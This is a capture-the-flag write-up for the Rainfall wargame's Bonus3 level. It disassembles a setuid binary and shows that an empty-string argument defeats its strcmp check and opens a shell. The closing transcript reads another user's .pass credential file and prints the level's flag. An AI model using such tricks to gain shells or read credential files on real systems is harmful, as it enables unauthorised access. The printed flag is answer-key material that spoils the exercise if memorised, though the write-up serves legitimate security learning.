# Rainfall

## Bonus3

```sh
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  strcmp
0x080483b0  strcmp@plt
0x080483c0  fclose
0x080483c0  fclose@plt
0x080483d0  fread
0x080483d0  fread@plt
0x080483e0  puts
0x080483e0  puts@plt
0x080483f0  __gmon_start__
0x080483f0  __gmon_start__@plt
0x08048400  __libc_start_main
0x08048400  __libc_start_main@plt
0x08048410  fopen
0x08048410  fopen@plt
0x08048420  execl
0x08048420  execl@plt
0x08048430  atoi
0x08048430  atoi@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  main    # <-----------
0x08048620  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048692  __i686.get_pc_thunk.bx
0x080486a0  __do_global_ctors_aux
0x080486cc  _fini
```

```sh
(gdb) disas main
   0x08048502 <+14>:    mov    $0x80486f0,%edx             # "r" or path piece
   0x08048507 <+19>:    mov    $0x80486f2,%eax             # path / "r"
   0x08048513 <+31>:    call   fopen@plt
   0x08048518 <+36>:    mov    %eax,0x9c(%esp)             # FILE*
   0x0804851f <+43>:    lea    0x18(%esp),%ebx             # buf
   0x08048528 <+52>:    mov    $0x21,%edx
   0x08048531 <+61>:    rep stos                          # zero 0x21 dwords
   0x08048533 <+63>:    cmpl   $0x0,0x9c(%esp)
   0x0804853d <+73>:    cmpl   $0x2,0x8(%ebp)              # argc == 2
   0x08048543 <+79>:    mov    $0xffffffff,%eax            # fail
   0x0804854d <+89>:    lea    0x18(%esp),%eax
   0x0804855c <+104>:   movl   $0x42,0x8(%esp)
   0x0804856f <+123>:   call   fread@plt                   # fread(buf, 1, 66, f)
   0x08048574 <+128>:   movb   $0x0,0x59(%esp)             # buf[0x41] = 0
   0x0804857f <+139>:   mov    (%eax),%eax                 # argv[1]
   0x08048584 <+144>:   call   atoi@plt
   0x08048589 <+149>:   movb   $0x0,0x18(%esp,%eax,1)      # buf[atoi(argv[1])] = 0
   0x08048592 <+158>:   lea    0x42(%eax),%edx             # buf+66
   0x080485b3 <+191>:   call   fread@plt                   # fread(buf+66, 1, 65, f)
   0x080485c2 <+206>:   call   fclose@plt
   0x080485da <+230>:   call   strcmp@plt                  # strcmp(buf, argv[1])
   0x080485e1 <+237>:   jne    0x8048601
   0x080485fa <+262>:   call   execl@plt                   # execl("/bin/sh", ...)
   0x08048605 <+273>:   add    $0x42,%eax
   0x0804860b <+279>:   call   puts@plt                    # else puts(buf+66)
```

This one is fairly simple, the program calls `atoi` on `argv[1]` and stores it in a variable called `n`
Then it does `buf[n]` = 0

Then it checks for `strcmp(buf, argv[1]) == 0`, if we just call the program using `""` as argv[1], atoi will return 0, buf[0] will be equal to 0 result in buf being "", then buf "" and argv[1] "" will be equal and the program will launch a shell

```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```